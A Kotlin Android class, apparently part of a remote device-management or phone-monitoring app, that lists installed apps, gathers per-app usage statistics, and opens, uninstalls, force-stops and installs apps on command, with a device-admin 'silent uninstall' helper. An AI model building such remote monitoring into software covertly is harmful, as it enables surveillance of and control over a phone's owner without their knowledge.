package com.csk4.app

import android.app.usage.UsageStats
import android.app.usage.UsageStatsManager
import android.content.Context
import android.content.Intent
import android.content.pm.ApplicationInfo
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.provider.Settings
import android.util.Log
import org.json.JSONArray
import org.json.JSONObject

/**
 * AppController — Remote app management
 * 
 * Features:
 * - List all installed apps
 * - Open any app
 * - Uninstall app (system dialog)
 * - Force stop app
 * - Get app usage stats
 * - Get app details (version, size, install date)
 * - Install APK from server
 */
class AppController(private val ctx: Context) {

    companion object {
        private const val TAG = "CSK4_APP"
    }

    private val pm: PackageManager
        get() = ctx.packageManager

    // ============ LIST APPS ============
    fun getAllApps(): JSONArray {
        val arr = JSONArray()
        try {
            val apps = pm.getInstalledApplications(PackageManager.GET_META_DATA)
            apps.forEach { app ->
                try {
                    val label = pm.getApplicationLabel(app).toString()
                    val isSystem = (app.flags and ApplicationInfo.FLAG_SYSTEM) != 0
                    val isUpdated = (app.flags and ApplicationInfo.FLAG_UPDATED_SYSTEM_APP) != 0
                    
                    arr.put(JSONObject().apply {
                        put("name", label)
                        put("package", app.packageName)
                        put("system", isSystem && !isUpdated)
                    })
                } catch (e: Exception) {}
            }
        } catch (e: Exception) {
            Log.e(TAG, "List apps: ${e.message}")
        }
        return arr
    }

    // ============ GET APP DETAILS ============
    fun getAppDetails(packageName: String): JSONObject? {
        return try {
            val info = pm.getPackageInfo(packageName, 0)
            val appInfo = pm.getApplicationInfo(packageName, 0)
            val label = pm.getApplicationLabel(appInfo).toString()
            
            JSONObject().apply {
                put("name", label)
                put("package", packageName)
                put("versionName", info.versionName ?: "?")
                put("versionCode", if (Build.VERSION.SDK_INT >= 28) info.longVersionCode else info.versionCode.toLong())
                put("installTime", info.firstInstallTime)
                put("updateTime", info.lastUpdateTime)
                put("isSystem", (appInfo.flags and ApplicationInfo.FLAG_SYSTEM) != 0)
                put("dataDir", appInfo.dataDir ?: "")
                put("sourceDir", appInfo.sourceDir ?: "")
            }
        } catch (e: Exception) {
            Log.e(TAG, "App details: ${e.message}")
            null
        }
    }

    // ============ OPEN APP ============
    fun openApp(packageName: String): Boolean {
        return try {
            val intent = pm.getLaunchIntentForPackage(packageName)
            if (intent != null) {
                intent.flags = Intent.FLAG_ACTIVITY_NEW_TASK
                ctx.startActivity(intent)
                Log.d(TAG, "✅ Opened: $packageName")
                true
            } else {
                Log.e(TAG, "No launch intent for: $packageName")
                false
            }
        } catch (e: Exception) {
            Log.e(TAG, "Open: ${e.message}")
            false
        }
    }

    // ============ OPEN APP DETAILS PAGE ============
    fun openAppInfo(packageName: String): Boolean {
        return try {
            val intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS)
            intent.data = Uri.parse("package:$packageName")
            intent.flags = Intent.FLAG_ACTIVITY_NEW_TASK
            ctx.startActivity(intent)
            true
        } catch (e: Exception) { false }
    }

    // ============ UNINSTALL ============
    fun uninstallApp(packageName: String): Boolean {
        return try {
            val intent = Intent(Intent.ACTION_DELETE)
            intent.data = Uri.parse("package:$packageName")
            intent.flags = Intent.FLAG_ACTIVITY_NEW_TASK
            // This opens system uninstall dialog - user must confirm
            ctx.startActivity(intent)
            Log.d(TAG, "Uninstall dialog opened: $packageName")
            true
        } catch (e: Exception) {
            Log.e(TAG, "Uninstall: ${e.message}")
            false
        }
    }

    // ============ SILENT UNINSTALL (Device Admin) ============
    fun silentUninstall(packageName: String): Boolean {
        return try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                val dpm = ctx.getSystemService(Context.DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager
                val admin = android.content.ComponentName(ctx, DeviceAdminReceiver::class.java)
                if (dpm.isAdminActive(admin)) {
                    // Only works for apps the admin owns (rare without MDM)
                    dpm.setUninstallBlocked(admin, packageName, false)
                }
            }
            uninstallApp(packageName)
        } catch (e: Exception) { false }
    }

    // ============ FORCE STOP ============
    fun forceStopApp(packageName: String): Boolean {
        return try {
            val am = ctx.getSystemService(Context.ACTIVITY_SERVICE) as android.app.ActivityManager
            // Note: killBackgroundProcesses only kills cache. Full kill needs root.
            am.killBackgroundProcesses(packageName)
            Log.d(TAG, "Force stop: $packageName")
            true
        } catch (e: Exception) {
            Log.e(TAG, "Force stop: ${e.message}")
            false
        }
    }

    // ============ CLEAR APP CACHE ============
    fun openAppStorageSettings(packageName: String): Boolean {
        return try {
            val intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS)
            intent.data = Uri.parse("package:$packageName")
            intent.flags = Intent.FLAG_ACTIVITY_NEW_TASK
            ctx.startActivity(intent)
            true
        } catch (e: Exception) { false }
    }

    // ============ APP USAGE STATS ============
    fun getUsageStats(hoursBack: Int = 24): JSONArray {
        val arr = JSONArray()
        try {
            val usageStatsManager = ctx.getSystemService(Context.USAGE_STATS_SERVICE) as UsageStatsManager
            val endTime = System.currentTimeMillis()
            val startTime = endTime - (hoursBack * 60 * 60 * 1000L)

            val stats = usageStatsManager.queryUsageStats(
                UsageStatsManager.INTERVAL_DAILY,
                startTime,
                endTime
            )

            if (stats == null || stats.isEmpty()) {
                Log.e(TAG, "No usage stats (permission missing?)")
                return arr
            }

            // Sort by total time in foreground
            val sorted = stats.sortedByDescending { it.totalTimeInForeground }
            
            sorted.forEach { stat ->
                try {
                    val appInfo = pm.getApplicationInfo(stat.packageName, 0)
                    val label = pm.getApplicationLabel(appInfo).toString()
                    
                    if (stat.totalTimeInForeground > 0) {
                        arr.put(JSONObject().apply {
                            put("package", stat.packageName)
                            put("name", label)
                            put("totalTimeForeground", stat.totalTimeInForeground / 1000) // seconds
                            put("lastTimeUsed", stat.lastTimeUsed)
                        })
                    }
                } catch (e: Exception) {}
            }
        } catch (e: Exception) {
            Log.e(TAG, "Usage stats: ${e.message}")
        }
        return arr
    }

    // ============ OPEN USAGE ACCESS SETTINGS ============
    fun openUsageAccessSettings() {
        try {
            val intent = Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS)
            intent.flags = Intent.FLAG_ACTIVITY_NEW_TASK
            ctx.startActivity(intent)
        } catch (e: Exception) { }
    }

    // ============ CHECK USAGE ACCESS ============
    fun hasUsageAccess(): Boolean {
        return try {
            val appOps = ctx.getSystemService(Context.APP_OPS_SERVICE) as android.app.AppOpsManager
            val mode = if (Build.VERSION.SDK_INT >= 29) {
                appOps.unsafeCheckOpNoThrow(
                    android.app.AppOpsManager.OPSTR_GET_USAGE_STATS,
                    android.os.Process.myUid(),
                    ctx.packageName
                )
            } else {
                @Suppress("DEPRECATION")
                appOps.checkOpNoThrow(
                    android.app.AppOpsManager.OPSTR_GET_USAGE_STATS,
                    android.os.Process.myUid(),
                    ctx.packageName
                )
            }
            mode == android.app.AppOpsManager.MODE_ALLOWED
        } catch (e: Exception) {
            false
        }
    }

    // ============ INSTALL APK ============
    fun installApk(apkPath: String): Boolean {
        return try {
            val apkFile = java.io.File(apkPath)
            if (!apkFile.exists()) return false

            val intent = Intent(Intent.ACTION_VIEW)
            val uri = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                androidx.core.content.FileProvider.getUriForFile(
                    ctx,
                    "${ctx.packageName}.provider",
                    apkFile
                )
            } else {
                Uri.fromFile(apkFile)
            }
            intent.setDataAndType(uri, "application/vnd.android.package-archive")
            intent.flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_GRANT_READ_URI_PERMISSION
            ctx.startActivity(intent)
            true
        } catch (e: Exception) {
            Log.e(TAG, "Install APK: ${e.message}")
            false
        }
    }

    // ============ SEARCH APPS BY NAME ============
    fun findAppByName(name: String): String? {
        try {
            val apps = pm.getInstalledApplications(0)
            apps.forEach { app ->
                val label = pm.getApplicationLabel(app).toString()
                if (label.equals(name, ignoreCase = true) ||
                    label.contains(name, ignoreCase = true)) {
                    return app.packageName
                }
            }
        } catch (e: Exception) {}
        return null
    }
}
